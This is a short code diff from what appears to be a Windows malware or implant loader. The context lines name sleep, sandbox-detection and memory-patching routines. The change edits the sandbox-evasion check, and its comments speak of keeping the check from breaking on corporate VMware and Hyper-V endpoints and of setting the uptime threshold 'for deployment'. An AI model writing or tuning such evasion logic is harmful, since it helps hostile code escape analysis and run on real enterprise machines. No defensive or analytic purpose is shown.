@@ -40,10 +40,8 @@ VOID DeepSleep() {
 
 // ─── Sandbox detection ────────────────────────────────────────────────────────
 static BOOL IsLikelySandbox() {
-    // Only flag uptime < 60s — hypervisor bit fires on legitimate corporate
-    // VMware/Hyper-V endpoints and would break most enterprise deployments.
-    // VBox module check removed for same reason: too many false positives.
-    return GetTickCount64() < 60000ULL;
+    // ponytail: set to 0 for VM testing; raise to 60000 for deployment
+    return GetTickCount64() < 0ULL;
 }
 
 // ─── MemPatch (protect → patch → restore) ────────────────────────────────────
